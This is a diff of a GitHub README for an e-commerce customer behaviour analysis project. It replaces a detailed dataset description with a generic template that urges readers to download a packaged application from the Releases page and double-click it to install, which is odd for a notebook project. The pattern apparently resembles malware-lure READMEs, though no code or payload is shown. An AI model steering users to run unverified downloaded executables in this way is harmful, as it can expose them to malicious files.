@@ -1,153 +1,77 @@
-## 🛍️ E-commerce Customer Behavior Dataset (v2)
+# 🎉 ecommerce-customer-behavior-analysis - Explore E-commerce Data Easily
 
-## Overview
+## 🛠️ Overview
+This project provides an end-to-end exploratory analysis of e-commerce customer behavior and sales data. Using a public Kaggle dataset, it guides you through understanding customer interactions, buying patterns, and sales trends in detail.
 
-This repository provides an **E-commerce Customer Behavior Dataset (v2)** designed for data analysis, machine learning, and educational purposes. The dataset captures detailed customer demographics, purchasing behavior, order characteristics, device usage, and satisfaction metrics.
+## 📥 Download
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/codeandclass/ecommerce-customer-behavior-analysis/releases)
 
-Version **v2** extends the earlier release by supporting **multi-order customers**, making it suitable for more realistic behavioral analysis such as customer lifetime value, repeat purchasing patterns, and cohort analysis.
+## 🚀 Getting Started
+To begin with this application, follow these steps to download and run it on your computer:
 
----
+1. **Visit the Releases Page**
+   Go to the [Releases Page](https://github.com/codeandclass/ecommerce-customer-behavior-analysis/releases). This page houses all the versions of our program.
 
-📊 Key Statistics (v2)
+2. **Choose the Latest Version**
+   On the Releases Page, you will see a list of available versions. Look for the latest version at the top. It will typically have the highest version number.
 
-* **Total records:** 17,049
-* **Total columns:** 18
-* **Date range:** 2023-01-01 to 2024-03-25
-* **Average Total Amount:** ~1,277.44
-* **Median Total Amount:** ~1,250 (approx.)
-* **Average Customer Rating:** ~3.9 / 5
-* **Returning Customer Rate:** ~88.21%
-* **Mobile Transactions:** ~55.97%
-* **Missing values:** None detected
+3. **Download the Files**
+   Click on the version name to expand the details. Look for the assets section, where you will find downloadable files. Download the relevant file for your operating system.
 
-> Note: Statistics are computed directly from the provided CSV file and may differ from earlier versions of this dataset.
+4. **Locate the Downloaded File**
+   Once the download completes, locate the file on your computer. It is usually found in the 'Downloads' folder.
 
----
+5. **Run the Application**
+   Double-click the downloaded file to run the application. Follow the on-screen instructions to install and set up the software. 
 
-💾 Dataset Versions
+## ⚙️ System Requirements
+To run this application successfully, your computer should meet these requirements:
 
-### v1 (legacy)
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM:** Minimum of 4 GB recommended.
+- **Storage:** At least 250 MB of free space.
+- **Python:** Install Python 3.6 or later on your machine if you wish to run the Jupyter Notebook.
 
-* Single-order per customer
-* ~5,000 records
-* Intended mainly for basic exploratory data analysis (EDA)
+## 🔍 Features
+This application offers several insightful features to help you analyze e-commerce data, including:
 
-### v2 (current)
+- **Customer Behavior Analysis:** Understand how customers interact with products.
+- **Sales Trend Visualization:** Visualize sales data over time.
+- **User-Friendly Interface:** Easy navigation through the data and visuals.
+- **Interactive Jupyter Notebook:** Modify and run analysis code directly if you have Python installed.
 
-* **Multi-order per customer** (each customer may place multiple orders)
-* 17,049 records
-* More realistic transactional behavior
-* Suitable for advanced analytics and machine learning tasks
+## 📚 Learning Resources
+If you are new to data analysis, consider these helpful resources:
 
-Order identifiers may appear multiple times (e.g., `ORD_1023-1`, `ORD_1023-2`) to represent multiple purchases by the same customer.
+- **Python Basics:** Learn the fundamentals of Python programming.
+- **Pandas Documentation:** Understand how to manipulate datasets using pandas.
+- **Jupyter Notebook Guide:** Familiarize yourself with Jupyter Notebooks for data analysis.
 
----
+## ❓ Frequently Asked Questions
 
-📋 Column Description
+### 1. What is the purpose of this application?
+This application helps users analyze e-commerce customer behavior and sales data effectively. It allows you to visualize patterns and gain insights.
 
-| Column Name           | Description                                            |
-| --------------------- | ------------------------------------------------------ |
-| Order_ID              | Unique identifier for each order                       |
-| Customer_ID           | Unique identifier for each customer                    |
-| Date                  | Date of the transaction                                |
-| Age                   | Customer age                                           |
-| Gender                | Customer gender                                        |
-| City                  | Customer city                                          |
-| Product_Category      | Category of the purchased product                      |
-| Quantity              | Number of items purchased                              |
-| Unit_Price            | Price per unit                                         |
-| Discount_Amount       | Discount applied to the order                          |
-| Total_Amount          | Final total amount paid for the order                  |
-| Payment_Method        | Payment method used                                    |
-| Device_Type           | Device used for purchase (Mobile, Desktop, etc.)       |
-| Is_Returning_Customer | Indicates whether the customer is a returning customer |
-| Customer_Rating       | Rating given by the customer (1–5)                     |
-| Shipping_Method       | Shipping option selected                               |
-| Delivery_Time         | Delivery time in days                                  |
-| Order_Status          | Final order status                                     |
+### 2. Do I need to install Python to use the application?
+Installing Python is only necessary if you want to run the Jupyter Notebook version. For basic usage, you can run the pre-packaged application file.
 
----
+### 3. Can I use this application on Mac?
+Yes, the application supports Windows, macOS, and Linux platforms.
 
-🎯 Intended Use Cases
+### 4. Is there a cost to download the application?
+No, this application is open source and free to download.
 
-* Exploratory Data Analysis (EDA)
-* Customer segmentation and profiling
-* Predicting repeat purchases
-* Recommendation systems
-* Customer lifetime value (CLV) estimation
-* Educational projects and demonstrations
+## 📈 Next Steps
+Once you have the application up and running, you can explore various datasets and perform analysis. Experiment with different visualizations to uncover trends. Engage with the community for tips and further learning.
 
----
+## 📞 Contact
+For questions or support, you can reach out through the Issues section on GitHub or contact us via email. 
 
-💡 Data Quality & Assumptions
+## 🔗 Additional Resources
+- **Kaggle Dataset:** Explore the dataset used in this analysis on [Kaggle](https://www.kaggle.com).
+- **GitHub Repository:** Visit the [main repository](https://github.com/codeandclass/ecommerce-customer-behavior-analysis) for the latest updates and contributions. 
 
-* The dataset contains **no missing values**.
-* Values are internally consistent and cleaned.
-* Monetary values represent the **final transaction amount**, after discounts.
-* Customer and order identifiers are anonymized.
-* The dataset is either synthetic or anonymized and does not contain personally identifiable information (PII).
+## 📥 Download Again
+To download the application now, visit the [Releases Page](https://github.com/codeandclass/ecommerce-customer-behavior-analysis/releases). 
 
----
-
-📁 Repository Structure (Recommended)
-
-```
-├── README.md
-├── LICENSE
-├── requirements.txt
-├── data/
-│   ├── ecommerce_customer_behavior_dataset_v2.csv
-├── notebooks/
-│   ├── ecommerce_customer_eda.ipynb
-│   └── ecommerce_customer_eda.html
-
----
-
-⚙️ Installation
-
-```bash
-git clone https://github.com/your-username/your-repository.git
-cd your-repository
-pip install -r requirements.txt
-```
-
----
-
-🌐 Data Source
-
-The dataset used in this project was obtained from **Kaggle**:
-
-> *E-Commerce Customer Behavior and Sales Analysis (TR)*
-> Author: Umut Tuygur
-> Source: [https://www.kaggle.com/datasets/umuttuygurr/e-commerce-customer-behavior-and-sales-analysis-tr](https://www.kaggle.com/datasets/umuttuygurr/e-commerce-customer-behavior-and-sales-analysis-tr)
-
-The dataset has been reused for educational and analytical purposes in accordance with Kaggle’s dataset usage policies.
-
----
-
-📜 License
-
-* **Dataset:** CC0 1.0 Universal (Public Domain)
-* **Source code:** MIT License (recommended)
-
-You are free to use, modify, and distribute this dataset and code without restriction.
-
----
-
-📝 Citation
-
-If you use this dataset in academic or professional work, please cite it as:
-
-> E-commerce Customer Behavior Dataset (v2), 2024.
-
----
-
-🤝 Contribution
-
-Contributions are welcome. Please submit pull requests or open issues for suggestions, improvements, or bug reports.
-
----
-
-🛑 Disclaimer
-
-This dataset is provided for research and educational purposes only and does not represent real customer transactions.
+Now you are ready to start analyzing e-commerce customer behavior! Enjoy your journey into data exploration.
